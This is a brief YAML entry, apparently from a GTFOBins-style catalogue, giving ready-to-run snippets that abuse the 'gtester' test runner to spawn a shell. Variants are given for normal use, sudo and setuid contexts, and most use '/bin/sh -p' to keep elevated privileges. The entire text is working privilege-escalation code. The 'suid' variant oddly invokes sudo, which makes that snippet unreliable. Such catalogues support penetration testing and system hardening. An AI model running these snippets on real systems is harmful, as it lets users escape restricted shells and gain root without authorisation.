---
functions:
  shell:
    - code: |
        TF=$(mktemp)
        echo '#!/bin/sh' > $TF
        echo 'exec /bin/sh -p 0<&1' >> $TF
        chmod +x $TF
        gtester -q $TF
  sudo:
    - code: |
        TF=$(mktemp)
        echo '#!/bin/sh' > $TF
        echo 'exec /bin/sh 0<&1' >> $TF
        chmod +x $TF
        sudo gtester -q $TF
  suid:
    - code: |
        TF=$(mktemp)
        echo '#!/bin/sh -p' > $TF
        echo 'exec /bin/sh -p 0<&1' >> $TF
        chmod +x $TF
        sudo gtester -q $TF
---
